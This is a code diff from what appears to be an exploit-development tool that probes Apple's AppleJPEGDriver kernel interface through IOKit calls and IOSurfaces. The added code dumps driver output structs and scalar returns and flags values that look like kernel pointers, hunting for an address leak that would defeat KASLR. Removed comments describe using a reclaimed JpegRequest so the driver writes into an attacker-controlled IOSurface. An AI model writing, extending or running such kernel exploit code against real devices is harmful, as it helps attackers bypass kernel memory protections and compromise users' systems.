@@ -421,7 +421,50 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
             size_t outSize = sizeof(output);
             kern_return_t kr = IOConnectCallStructMethod(wconn, 1,
                 &input, sizeof(input), &output, &outSize);
-            [self log:@"Warmup decode: kr=0x%x", kr];
+            [self log:@"Warmup decode: kr=0x%x outSize=%zu", kr, outSize];
+
+            // Dump output struct as qwords — kernel may echo back useful data
+            uint64_t *qws = (uint64_t *)&output;
+            [self log:@"  [00] %016llx %016llx", qws[0], qws[1]];
+            [self log:@"  [16] %016llx %016llx", qws[2], qws[3]];
+            [self log:@"  [32] %016llx %016llx", qws[4], qws[5]];
+            [self log:@"  [48] %016llx %016llx", qws[6], qws[7]];
+            [self log:@"  [64] %016llx %016llx", qws[8], qws[9]];
+            [self log:@"  [80] %016llx", qws[10]];
+
+            // Probe sel 0 (getTarget) with SCALAR output — may return kernel ptr
+            {
+                uint64_t scalOut[8] = {0};
+                uint32_t scCnt = 8;
+                kr = IOConnectCallScalarMethod(wconn, 0,
+                    NULL, 0, scalOut, &scCnt);
+                [self log:@"Sel 0 scalar: kr=0x%x cnt=%u", kr, scCnt];
+                for (uint32_t si = 0; si < scCnt && si < 8; si++) {
+                    uint64_t v = scalOut[si];
+                    if (v) {
+                        uint64_t hi = v >> 40;
+                        [self log:@"  sc[%u] 0x%016llx %s", si, v,
+                            (hi == 0xfffffe || hi == 0xffffff) ? "*** KP" : ""];
+                    }
+                }
+            }
+
+            // Probe sel 2 (query) with SCALAR output too
+            {
+                uint64_t scalOut[8] = {0};
+                uint32_t scCnt = 8;
+                kr = IOConnectCallScalarMethod(wconn, 2,
+                    NULL, 0, scalOut, &scCnt);
+                [self log:@"Sel 2 scalar: kr=0x%x cnt=%u", kr, scCnt];
+                for (uint32_t si = 0; si < scCnt && si < 8; si++) {
+                    uint64_t v = scalOut[si];
+                    if (v) {
+                        uint64_t hi = v >> 40;
+                        [self log:@"  sc[%u] 0x%016llx %s", si, v,
+                            (hi == 0xfffffe || hi == 0xffffff) ? "*** KP" : ""];
+                    }
+                }
+            }
 
             // Now probe sel 4/5 while driver has recent activity
             uint8_t *in4k = calloc(0x1000, 1);
@@ -489,20 +532,20 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
         }
 
         // ========================================================
-        // PHASE 2: Try to use IOSurface as data channel
-        // Submit decode from a surface, reclaim the JpegRequest
-        // with our surface IDs → DMA writes to OUR surface.
-        // Read back surface contents — check for non-pixel data.
+        // PHASE 2: Decode with real JPEG, dump output struct
+        // Previous attempt: 0xBB pattern in surface → kr=0xe00002d1
+        // Fix: use actual JPEG data, check output for kernel pointers
         // ========================================================
         [self log:@""];
-        [self log:@"--- Phase 2: IOSurface data channel probe ---"];
+        [self log:@"--- Phase 2: Decode with real JPEG + struct dump ---"];
 
-        // Create a known-pattern source surface
-        size_t surfLen = 64 * 1024; // 64KB
+        // Create a small JPEG for probing
+        NSData *smallJPEG = [self createTestJPEG:64 height:64];
+        size_t jpegLen = smallJPEG.length;
         IOSurfaceRef probeSrc = NULL, probeDst = NULL;
         {
             NSDictionary *srcProps = @{
-                (id)kIOSurfaceWidth:           @(surfLen),
+                (id)kIOSurfaceWidth:           @(jpegLen),
                 (id)kIOSurfaceHeight:          @1,
                 (id)kIOSurfaceBytesPerElement: @1,
                 (id)kIOSurfacePixelFormat:     @0x20202020,
@@ -510,8 +553,8 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
             probeSrc = IOSurfaceCreate((__bridge CFDictionaryRef)srcProps);
 
             NSDictionary *dstProps = @{
-                (id)kIOSurfaceWidth:           @4096,
-                (id)kIOSurfaceHeight:          @16,
+                (id)kIOSurfaceWidth:           @64,
+                (id)kIOSurfaceHeight:          @64,
                 (id)kIOSurfaceBytesPerElement: @4,
                 (id)kIOSurfacePixelFormat:     @0x42475241,
             };
@@ -519,9 +562,10 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
         }
 
         if (probeSrc && probeDst) {
-            // Fill source with known pattern (0xBB)
+            // Fill source with real JPEG data
             IOSurfaceLock(probeSrc, 0, NULL);
-            memset(IOSurfaceGetBaseAddress(probeSrc), 0xBB, surfLen);
+            memcpy(IOSurfaceGetBaseAddress(probeSrc),
+                smallJPEG.bytes, jpegLen);
             IOSurfaceUnlock(probeSrc, 0, NULL);
 
             // Clear destination
@@ -533,19 +577,18 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
             uint32_t psID = IOSurfaceGetID(probeSrc);
             uint32_t pdID = IOSurfaceGetID(probeDst);
 
-            // Submit 1 sync decode with these surfaces
             io_connect_t pconn = [self openUC:svc];
             if (pconn) {
                 AppleJPEGDriverIOStruct in = {0};
                 AppleJPEGDriverIOStruct out = {0};
                 in.sourceID    = psID;
-                in.field_04    = surfLen;
+                in.field_04    = (uint32_t)jpegLen;
                 in.destID      = pdID;
-                in.field_0C    = 4096 * 16 * 4;
-                in.width       = 4096;
-                in.height      = 16;
-                in.outWidth    = 4096;
-                in.outHeight   = 16;
+                in.field_0C    = 64 * 64 * 4;
+                in.width       = 64;
+                in.height      = 64;
+                in.outWidth    = 64;
+                in.outHeight   = 64;
                 in.subsampling = 3;
                 size_t os = sizeof(out);
                 kern_return_t kr = IOConnectCallStructMethod(pconn, 1,
